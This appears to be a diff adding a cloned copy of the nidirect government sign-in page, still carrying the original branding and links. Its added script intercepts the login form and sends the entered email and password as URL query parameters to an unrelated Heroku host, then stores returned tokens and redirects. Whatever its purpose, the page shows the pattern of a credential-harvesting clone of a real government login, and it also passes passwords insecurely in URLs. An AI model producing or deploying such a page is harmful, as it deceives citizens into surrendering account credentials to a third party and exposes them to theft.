@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<!-- saved from url=(0043)https://identity.nidirect.gov.uk/Home/Index -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>NIDA landing page</title>
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+
+    <link href="./NIDA landing page_files/bootstrap.min.css" rel="stylesheet">
+<link href="./NIDA landing page_files/bootstrap-responsive.css" rel="stylesheet">
+<link href="./NIDA landing page_files/nidirect.css" rel="stylesheet">
+<link href="./NIDA landing page_files/nidirect-responsive.css" rel="stylesheet">
+<link href="./NIDA landing page_files/nida.css" rel="stylesheet">
+<link href="./NIDA landing page_files/Site.css" rel="stylesheet">
+<link rel="shortcut icon" href="https://www.nidirect.gov.uk/sites/all/themes/nidirect_theme/favicon.ico" type="image/vnd.microsoft.icon">
+
+<script src="./NIDAAccount_files/jquery.min.js"></script>
+
+<script src="./NIDAAccount_files/bootstrap.js"></script>
+<script src="js/config.json"></script>
+<script src="js/box.js"></script>
+
+    <link href="https://identity.nidirect.gov.uk/images/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <link rel="icon" type="image/vnd.microsoft.icon" href="https://identity.nidirect.gov.uk/images/favicon.ico">
+    <link rel="apple-touch-icon" href="https://identity.nidirect.gov.uk/images/favicon.ico">
+    <link rel="stylesheet" media="screen and (min-device-width: 1px) and (max-device-width: 449px)" href="./NIDA landing page_files/smalldevice.css">
+    <link rel="stylesheet" media="screen and (min-device-width: 450px)" href="./NIDA landing page_files/largedevice.css">
+</head>
+<script>
+  //Change this to change Application context
+  $(document).ready(function() {
+    $.get( "https://box-heroku-token-generator.herokuapp.com/index.html", function( data ) {
+      console.log( "hit to start" );
+    });
+      sessionStorage.clear();
+      $('#userlogin').on('submit', (function(ev) {
+      $("#submit-login-btn").hide();
+      $("#loader").show();
+      ev.preventDefault();
+      var userLogin = $("#Username").val();
+      var pwd = $("#Password").val();
+      var urlParams = "clientId=" + clientId + "&userEmail=" + userLogin + "&password=" + pwd;
+      $.ajax({
+        method: 'get',
+        url: "https://box-heroku-token-generator.herokuapp.com/jwttokengenerator?" + urlParams,
+        //url: "http://localhost:5000/jwttokengenerator?" + urlParams,
+        crossDomain: true,
+        cache: false,
+        success: function(response) {
+          sessionStorage.setItem("accessToken",response.userToken);
+          sessionStorage.setItem("userLogin",userLogin);
+          sessionStorage.setItem("adminAccessToken",response.adminAccessToken);
+          sessionStorage.setItem("key",response.key);
+          sessionStorage.setItem("ttl",response.ttl);
+          window.location.replace(redirectAfterLoginPage);
+        },
+        error: function(err) {
+          console.log(JSON.stringify(err));
+          $("#signbutton").show();
+          $("#loader").hide();
+          $("#errormessage").show();
+          $("#errormessage").html(err.responseText);
+        }
+      });
+    }));
+  });
+</script>
+
+<body class="no-js">
+    <div class="page">
+        <div class="skipnav">
+            <a href="https://identity.nidirect.gov.uk/Home/Index#skip-dest">Skip to content</a>
+        </div>
+
+        <header>
+            <div class="navbar">
+                <div class="navbar-inner">
+                    <div class="container">
+
+
+                        <a class="brand" href="http://www.nidirect.gov.uk/">
+                            <img alt="n i direct government services" src="./NIDA landing page_files/nidirect-logo-small-2x.png" width="120" height="28">
+                        </a>
+                        <div class="nav-collapse collapse">
+                            <nav class="topnav">
+                                <ul>
+
+
+
+<li style="text-align: center"><a href="https://www.nidirect.gov.uk/contacts/contacts-az/nida-support">Contact us</a></li>
+
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="branding">
+                <a href="http://www.nidirect.gov.uk/"><img class="nidirectlogo" src="./NIDA landing page_files/nidirect-logo-2x.png" alt="n i direct government services"></a>
+                <div class="service-name">My account</div>
+            </div>
+        </header>
+
+        <div class="content container">
+
+
+
+
+<h1>Do you have an nidirect account?</h1>
+
+
+
+
+
+
+
+<form action="#" id="userlogin" class="form loginform" method="get">    <fieldset id="login">
+
+        <legend>I have an account</legend>
+
+        <div>
+            <img src="./NIDA landing page_files/required.gif" alt="Required"> Indicates a required field
+        </div>
+
+        <div class="control-group ">
+            <label class="form-label" for="Username"><img alt="Required information" src="./NIDA landing page_files/required.gif"> Email address </label>
+
+            <input autocomplete="off" id="Username" name="Username" type="text" value="">
+        </div>
+
+        <div class="control-group ">
+            <label class="form-label" for="Password"><img alt="Required information" src="./NIDA landing page_files/required.gif"> Password </label>
+
+            <input autocomplete="off" id="Password" name="Password" type="password">
+        </div>
+
+        <div class="button-div">
+            <input type="submit" value="Sign in" id="submit-login-btn" class="btn btn-primary">
+        </div>
+
+        <p>
+            <a href="https://identity.nidirect.gov.uk/ChangePassword/Index" id="ChangeMyPasswordButton" title="Change or forgotten password." class="">I've forgotten my password</a><br>
+            <a href="https://identity.nidirect.gov.uk/Account/Index" title="Change in circumstances (name, address)." class="">Manage my account details</a>
+        </p>
+    </fieldset>
+    <fieldset id="register">
+        <legend>I need an account</legend>
+        <div>
+            <a href="/NIDirect/account.html" class="btn btn-success">Create account</a>
+        </div>
+    </fieldset>
+<input type="hidden" name="as_sfid" value="AAAAAAUAEYKviuYtKup7ZLS8Pn11FAlhVpTvi0ajDNMoZaxg6AUVlvCYttjANtxruvIZBQEnnay6FfyzI-I69tYRr5GbrdUGkwbOqYjE_AnGI9N4LzrkbFUOvtA3BB3nngiFG6o="><input type="hidden" name="as_fid" value="0070b13f5efd1d1258a0a8602f7e0a8ffb368399"></form>
+        </div>
+
+        <footer class="footer">
+            <ul>
+                <li><a href="http://www.nidirect.gov.uk/crown-copyright" target="_blank" class="elink" title="link opens in a new browser window">© Crown copyright</a></li>
+                <li><a href="http://www.nidirect.gov.uk/terms-and-conditions" target="_blank" class="elink" title="link opens in a new browser window">Terms and conditions</a></li>
+                <li><a href="http://www.nidirect.gov.uk/privacy" target="_blank" class="elink" title="link opens in a new browser window">Privacy</a></li>
+                <li><a href="http://www.nidirect.gov.uk/cookies" target="_blank" class="elink" title="link opens in a new browser window">Cookies</a></li>
+            </ul>
+        </footer>
+    </div>
+
+
+    <script src="./NIDA landing page_files/jquery.min.js"></script>
+
+    <script src="./NIDA landing page_files/bootstrap.js"></script>
+
+
+
+
+
+</body></html>
